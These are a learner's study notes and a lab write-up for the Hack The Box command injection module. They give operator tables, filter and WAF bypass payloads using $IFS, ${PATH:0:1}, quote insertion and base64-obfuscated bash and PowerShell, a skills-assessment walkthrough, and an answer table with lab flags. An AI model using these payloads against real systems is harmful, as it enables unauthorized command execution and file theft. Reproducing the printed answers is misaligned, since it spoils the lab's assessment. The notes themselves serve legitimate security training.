# Command Injections (HTB Supplementary)

#CommandInjection #FilterBypass #SpaceBypass #ObfuscationTechniques #Base64Obfuscation #WAFBypass #InjectionOperators #HTBSupplementary

**HTB Command Injections module**, supplements [[Common Web Application Attacks#9.4.1. OS Command Injection|Module 9.4.1 command injection]]. The Offsec module covers detection and basic operator chaining. This module adds: the full injection operator table (which output each shows), systematically identifying which operators are filtered, space filter bypass (`$IFS`, `%09`, brace expansion), character filter bypass (`${PATH:0:1}` for `/`), command blacklist bypass (quote insertion), and full base64 obfuscation (`bash<<<$(base64 -d<<<...)`).

Already in vault: basic injection operator chaining (`;`, `&&`, `&`), systematic diagnosis workflow, CMD vs PowerShell detection. See [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]], [[Web Applications#Command Injection Diagnosis|Command Appendix]].

> 🔁 Cross-refs: [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]], [[Web Applications#Command Injection|Command Appendix]], [[Web Applications (Decision Tree)|Decision Tree]]

---

## Outstanding Sections

- [x] CI.1. Injection Operators (operators + which output each shows)
- [x] CI.2. Identifying Filters (testing which operators are blocked)
- [x] CI.3. Bypassing Space Filters ($IFS, %09, brace expansion)
- [x] CI.4. Bypassing Other Blacklisted Characters (${PATH:0:1} for slash)
- [x] CI.5. Bypassing Blacklisted Commands (quote insertion)
- [x] CI.6. Advanced Command Obfuscation (base64 encoding full commands)
- [x] CI.7. Skills Assessment (error-based output, & whitelisted in URL, combined bypass)

---

## CI.1. Injection Operators

All operators inject a second command after the first. The key distinction is what the response shows:

| Operator | URL-encoded | Bash behavior | Output shown |
|----------|------------|--------------|-------------|
| `;` | `%3B` | Run both sequentially regardless of exit status | Both (first then second) |
| `\n` (new-line) | `%0a` | Same as `;` in bash | Both |
| `&` | `%26` | Run both; second runs in background | Both (may be interleaved/out of order) |
| `&&` | `%26%26` | Run second only if first succeeds (exit 0) | Both (only if first succeeds) |
| `\|` | `%7c` | Pipe first's stdout to second's stdin | Second only |
| `\|\|` | `%7c%7c` | Run second only if first fails (non-zero exit) | Second only (only if first fails) |

**Which operator to use when:**
- Want to see both commands' output? Use `;` or `%0a`
- Want only the injected command's output (cleaner to read)? Use `|`
- First command might fail (e.g., invalid input before the injection)? Use `||` to guarantee the second runs
- Target allows `&` in URLs (common, it's a valid URL query delimiter)? Use `%26`

**Q1 (Detection):** `Please match the requested format.` (client-side HTML pattern validation blocks `;`)
**Q2 (Injecting Commands):** Line `17` (where the regex pattern is defined in the HTML source)
**Q3 (Other Injection Operators):** `|` (pipe shows only the second command's output)

#### Tags: #CommandInjection #InjectionOperators #Operators

---

## CI.2. Identifying Filters

When one operator is blocked, others may not be. Test each one systematically via Burp intercept:

```
# Test each in the intercepted request body (IP field):
127.0.0.1;id        → blocked?
127.0.0.1&&id       → blocked?
127.0.0.1|id        → blocked?
127.0.0.1%0aid      → NOT blocked? → new-line (%0a) slips through
127.0.0.1%26id      → blocked?
```

URL-encoded `%0a` (new-line) is a very common filter gap because:
- Developers block `; | & ||` (the obvious operators) but forget `\n`
- WAF rules that pattern-match for `;` or `|` in POST bodies often don't flag a raw newline character
- Bash treats `\n` exactly like `;`, it's a valid command separator

> 🔍 Worth remembering generally: always test `%0a` first when `;` is blocked. It's the easiest bypass and the most commonly missed filter. If a WAF blocks all obvious operators, try URL-encoded alternatives: `%0d%0a` (CRLF), `%0d` (CR alone), `%00` (null byte, may terminate the first command on some systems).

**Q1 Answer:** `new-line` (%0a was not blacklisted)

#### Tags: #CommandInjection #FilterIdentification #NewLineBypass

---

## CI.3. Bypassing Space Filters

When the server strips or blocks space characters from the injected payload, spaces in the command arguments break execution. Alternatives:

| Bypass | Example | Notes |
|--------|---------|-------|
| `$IFS` | `ls$IFS-la` | Internal Field Separator — bash expands it to whitespace; no literal space needed |
| `${IFS}` | `ls${IFS}-la` | Explicit brace form, sometimes needed if `$IFS` is ambiguous |
| `%09` | `ls%09-la` | URL-encoded tab — bash treats tab as whitespace |
| `{cmd,-args}` | `{ls,-la}` | Brace expansion — bash runs `ls -la` without any space in the raw payload |

```bash
# Full intercepted request payload examples (new-line bypass + space bypass):
ip=127.0.0.1%0als$IFS-la
ip=127.0.0.1%0als%09-la
```

**Checking file sizes:**
```bash
# ls -la output shows size in the 5th column
# index.php size: 1613 bytes
```

> 🔍 Worth remembering generally: `$IFS` is the most universally useful space bypass. `{cmd,-arg}` brace expansion is cleaner for simple one-arg commands but gets awkward with multiple arguments (`{cmd,-a,-b,-c}` works but is verbose). `%09` (tab) is the best URL-friendly fallback when the server decodes `$IFS` literally before passing to the shell.

**Q1 Answer:** `1613` (size of index.php from `ls$IFS-la`)

#### Tags: #SpaceBypass #IFS #BraceExpansion #FilterBypass

---

## CI.4. Bypassing Other Blacklisted Characters

When `/` (forward slash) is in the blacklist, paths like `/etc/passwd` or `/home/user/flag.txt` can't be typed literally. The workaround: extract the character from an environment variable.

**Slash bypass — Linux:**
```bash
${PATH:0:1}          # PATH always starts with / — slice first char
${HOME:0:1}          # HOME also starts with /
# Usage:
ls${IFS}${PATH:0:1}home
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

`${VAR:START:LENGTH}` is bash substring syntax. `${PATH:0:1}` means: take `$PATH`, start at index 0, return 1 character, which is always `/`.

**Other characters from env vars:**
```bash
${PATH:1:1}          # whatever char is at position 1 in $PATH (usually 'u' or 's')
${IFS:0:1}           # extracts the first character of IFS (a space)
```

**Windows (PowerShell) slash bypass:**
```powershell
$env:HOMEPATH[0]     # C:\ — first char is 'C', not useful here
$env:HOMEPATH[2]     # '\' — the backslash
```

**Full Linux payload — list /home directory:**
```
ip=127.0.0.1%0als$IFS${PATH:0:1}home
```

> 🔧 Technique: to build any path character by character, find which position in `$PATH` or other long env vars contains the character you need: `echo $PATH` on a system to see its value (e.g. `/usr/local/sbin:/usr/local/bin:...`). Characters beyond `/` can be extracted by incrementing the index. Less common characters can come from `$LOGNAME`, `$HOSTNAME`, `$TERM`, or other env vars, `printenv` shows them all.

**Q1 Answer:** `1nj3c70r` (user in /home found via `ls${IFS}${PATH:0:1}home`)

#### Tags: #SlashBypass #EnvVarBypass #CharacterFilterBypass #PATH

---

## CI.5. Bypassing Blacklisted Commands

When specific commands like `cat`, `ls`, `whoami` are on a blacklist, the server compares the command string literally. Inserting characters that the shell strips before execution fools the string comparison:

**Quote insertion**, bash removes unquoted/escaped single/double quotes before running:
```bash
c'a't              # bash sees: cat
c"a"t              # bash sees: cat
wh''oami           # bash sees: whoami
/bin/c'a't         # bash sees: /bin/cat
```

The server's blacklist compares `c'a't` to `cat` and finds no match. Bash strips the quotes, then runs `cat`.

**Other obfuscation options:**
```bash
\c\a\t             # backslash escapes — bash strips them
$@cat              # $@ is empty in most contexts; bash sees: cat (the $@ expands to nothing)
```

**Full payload — read a flag file:**
```
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

Breaks down as:
- `%0a` — new-line operator (bypasses `;` filter)
- `c'a't` — `cat` with quotes to bypass command blacklist
- `${IFS}` — space bypass
- `${PATH:0:1}` — `/` bypass, repeated for each slash in the path

> 🔍 Worth remembering generally: quote insertion is the simplest command bypass and works on any bash-executed command. The shell processes quote removal AFTER command lookup, so `c'a't` runs as if you typed `cat`. This works for any alphabetic command: `l's'`, `wh''oami`, `bas''h`, etc.

**Q1 Answer:** `HTB{b451c_f1l73r5_w0n7_570p_m3}`

#### Tags: #CommandBypass #QuoteInsertion #BlacklistBypass

---

## CI.6. Advanced Command Obfuscation — Base64

When the command contains characters that are individually filtered (slashes, spaces, pipes, special chars), base64-encoding the entire command bypasses all character-level filters at once.

### Encode and decode pattern

```bash
# Step 1: encode the command on your Kali box
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
# Output: ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=

# Step 2: build the execution payload (decode + pipe to bash)
bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

**Why `<<<` instead of pipes:** `<<<` is a "here-string", it feeds a string directly to a command's stdin without needing `echo | base64 -d`. No pipe character (`|`) appears in the payload, which matters when `|` is blacklisted. Two levels of `<<<` nest the decode inside the command substitution.

**Combined with filter bypasses:**
```
# In the intercepted request — space bypass (%09) + new-line (%0a) + base64:
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

**Other encoding approaches:**
```bash
# Hex encoding
echo -n 'id' | xxd -p | tr -d '\n'    # 6964
eval $(echo '6964' | xxd -r -p)       # runs: id

# Via variable substitution
cmd='cat /etc/passwd'; $cmd           # if variable assignment isn't filtered
```

**Base64 quick-ref for common commands:**
```bash
echo -n 'cat /flag.txt' | base64      # Y2F0IC9mbGFnLnR4dA==
echo -n 'id' | base64                  # aWQ=
echo -n 'whoami' | base64             # d2hvYW1p
```

> 🔧 Technique: the base64 approach is the last resort, it bypasses every character filter simultaneously, but it requires the target to have `bash` and `base64` available (true on virtually all Linux systems). If `bash` itself is blacklisted, try `sh<<<` instead (POSIX-compatible). If `base64` is blacklisted, try `openssl enc -d -base64<<<` (same function, different binary name).

**Q1 Answer:** `/usr/share/mysql/debian_create_root_user.sql`

#### Tags: #Base64Obfuscation #HereString #AdvancedObfuscation #AllFilterBypass

---

## CI.7. Skills Assessment

**Target:** web-based file manager (`guest:guest` login). Files have four buttons: Preview, Copy to..., Direct link, Download. `Copy to...` and `Move` are the candidates since they likely run `cp` or `mv` on the backend.

### Step 1: Find which function leaks output

- **Copy**: no visible output on success
- **Move** (with no destination selected): server prints an error message that reveals the failing command (e.g., `mv: missing destination file operand`)

This means `mv` error output reaches the HTTP response, it's an error-based output channel. To exploit it, the original `mv` command must fail (to trigger the error path), AND the injected command must still run.

### Step 2: Identify which injection operator passes the WAF

The `to` and `from` GET parameters both feed the `mv` command. Testing injection operators in Burp Repeater:
- `;`, `%3B`, `|`, `||`, `&&`, `%0a` → "Malicious request denied!" (WAF blocks them)
- `&`, `%26` → passes through (WAF treats `&` as a normal URL query delimiter and whitelists it)

URL-encode the `&` as `%26` so it's interpreted as a shell operator rather than a URL parameter separator.

### Step 3: Craft the payload

Two equivalent payloads (append to the `to` parameter value):

**Option 1 — quote insertion + `${PATH:0:1}` + `$IFS`:**
```
/index.php?to=tmp$IFS%26c"a"t$IFS${PATH:0:1}flag.txt&from=FILE.txt&finish=1&move=1
```

Breakdown:
- `$IFS` — space bypass
- `%26` — URL-encoded `&` operator (chains injected command)
- `c"a"t` — quote insertion to bypass `cat` blacklist
- `${PATH:0:1}` — `/` bypass

**Option 2 — base64:**
```
/index.php?to=tmp$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)&from=FILE.txt&finish=1&move=1
```

`Y2F0IC9mbGFnLnR4dA==` = `cat /flag.txt` base64-encoded.

> 📸 Screenshot: Burp Repeater showing response with HTB{...} flag value from the Move error output

> 🔧 Technique: the skills assessment demonstrates that you don't need a direct success channel, an error message that leaks the command output is just as useful. The key insight: make the first command FAIL (no destination = mv error) so the app enters the error-printing path, then inject a second command that always succeeds (cat). The `&` operator is perfect here: both commands run, but the first fails (triggering the error output channel), while the second outputs the flag to the same channel.

**Skills Assessment attack chain (Mermaid):**
```mermaid
flowchart TD
    A[File manager: Move function] --> B[No destination → mv error in response\nconfirms error output channel]
    B --> C[Test injection operators in Burp]
    C --> D[& /%26/ passes WAF — whitelisted as URL char]
    D --> E[Craft payload: to=tmp$IFS%26c"a"t$IFS${PATH:0:1}flag.txt]
    E --> F[mv fails → error path executes\n& chains cat command\nflag in error response]
```

**Q1 Answer:** `HTB{c0mm4nd3r_1nj3c70r}`

#### Tags: #SkillsAssessment #CommandInjection #ErrorBasedOutput #FilterBypass #AmpersandBypass

---

## All Q&A Answers

| Section | Q# | Answer |
|---------|----|--------|
| Detection | 1 | `Please match the requested format.` |
| Injecting Commands | 1 | `17` |
| Other Injection Operators | 1 | `\|` |
| Identifying Filters | 1 | `new-line` |
| Bypassing Space Filters | 1 | `1613` |
| Bypassing Other Blacklisted Characters | 1 | `1nj3c70r` |
| Bypassing Blacklisted Commands | 1 | `HTB{b451c_f1l73r5_w0n7_570p_m3}` |
| Advanced Command Obfuscation | 1 | `/usr/share/mysql/debian_create_root_user.sql` |
| Skills Assessment | 1 | `HTB{c0mm4nd3r_1nj3c70r}` |

---

## External Resources

- [HackTricks. Command Injection](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/command-injection.md)
- [PayloadsAllTheThings. Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Commix](https://github.com/commixproject/commix), automated command injection tool (same excluded category as sqlmap; useful to verify a finding but learn the manual technique first)
- [ippsec.rocks](https://ippsec.rocks/?#), search "command injection" for real box examples

---

## Module Summary

Operator table: `;`/`%0a` (both outputs), `&`/`&&` (both outputs, second conditional), `|`/`||` (second output only, conditional). Filter identification: test each operator via Burp, `%0a` (new-line) is the most commonly missed. Filter bypass ladder: space → `$IFS` or `%09`; slash → `${PATH:0:1}`; command blacklist → quote insertion (`c'a't`); everything → base64 encode + `bash<<<$(base64 -d<<<B64)`. WAF gotcha: `&` often whitelisted as a URL character, use `%26` to make it a shell operator. Error-based output: make the first command fail to enter the error branch, then chain the real command, the error message leaks both.


---

## HTB Module Quick Reference

Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.

```bash
# ============================================================
# INJECTION OPERATORS — try each when a field is injectable
# ============================================================
# ; (semicolon)    — both commands run, URL-encode as %3b
# \n (newline)     — both commands run, URL-encode as %0a  ← most reliable
# &                — both run (second output first), URL: %26
# |                — both run (only second shown), URL: %7c
# &&               — both run only if first succeeds, URL: %26%26
# ||               — second runs only if first fails, URL: %7c%7c

# Probing examples (append to a field that calls a system command):
127.0.0.1%0aid        # newline after IP — cleanest
127.0.0.1;id
127.0.0.1|id

# ============================================================
# LINUX: SPACE FILTER BYPASS
# ============================================================
# If spaces are blocked:
%09             # tab character — accepted by bash as whitespace
${IFS}          # internal field separator — expands to space/tab
{ls,-la}        # brace expansion — comma acts as space separator

# Examples:
127.0.0.1%0a{cat,/etc/passwd}
127.0.0.1%0acat${IFS}/etc/passwd

# ============================================================
# LINUX: SLASH FILTER BYPASS
# ============================================================
${PATH:0:1}           # first char of PATH is always /
echo ${PATH:0:1}      # → /

# Semicolon via env var (LS_COLORS usually has ; at position 10)
echo ${LS_COLORS:10:1}   # → ;

# ============================================================
# LINUX: BLACKLISTED COMMAND BYPASS
# ============================================================
# Quote insertion (even number of quotes — bash ignores them)
c'a't /etc/passwd
w'h'o'a'm'i

# Dollar-sign insertion (Linux only)
w$@hoami

# Case manipulation
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")

# Reversed command
$(rev<<<'imaohw')

# Base64 encoded command (avoids keyword blacklists entirely)
echo -n 'cat /etc/passwd | grep 33' | base64   # → encode it
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)   # execute it

# ============================================================
# WINDOWS: SPACE FILTER BYPASS
# ============================================================
%09                              # tab (CMD)
%PROGRAMFILES:~10,-5%            # space from env var substring (CMD)
$env:PROGRAMFILES[10]            # space from env var (PowerShell)

# ============================================================
# WINDOWS: SLASH/BACKSLASH FILTER BYPASS
# ============================================================
%HOMEPATH:~0,-17%                # → \ (CMD)
$env:HOMEPATH[0]                 # → \ (PowerShell)

# ============================================================
# WINDOWS: BLACKLISTED COMMAND BYPASS
# ============================================================
WhoAmI                           # case manipulation (CMD ignores case)
^w^h^o^a^m^i                    # caret insertion (CMD only)

# Reversed command (PowerShell)
iex "$('imaohw'[-1..-20] -join '')"

# Base64 encoded (PowerShell — note: Unicode encoding required)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
